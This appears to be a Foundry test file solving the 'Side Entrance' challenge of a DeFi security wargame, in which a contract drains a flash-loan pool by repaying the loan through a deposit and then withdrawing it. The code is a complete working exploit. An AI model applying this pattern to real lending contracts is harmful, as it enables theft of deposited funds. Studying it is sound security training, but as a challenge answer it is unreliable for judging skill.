// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";

import {SideEntranceLenderPool} from "../../../Contracts/side-entrance/SideEntranceLenderPool.sol";

contract HackContract {
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address public owner;
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    constructor(SideEntranceLenderPool _sideEntranceLenderPool) {
        sideEntranceLenderPool = _sideEntranceLenderPool;
        owner = msg.sender;
    }

    function execute() external payable {
        require(msg.sender == address(sideEntranceLenderPool), "Not pool");
        sideEntranceLenderPool.deposit{value: msg.value}();
    }

    function attack() public payable {
        require(msg.sender == owner, "Not Owner");
        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);

        sideEntranceLenderPool.withdraw();

        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract SideEntrance is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testSideEntranceExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        HackContract hackContract = new HackContract(sideEntranceLenderPool);
        hackContract.attack();
        vm.stopPrank();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
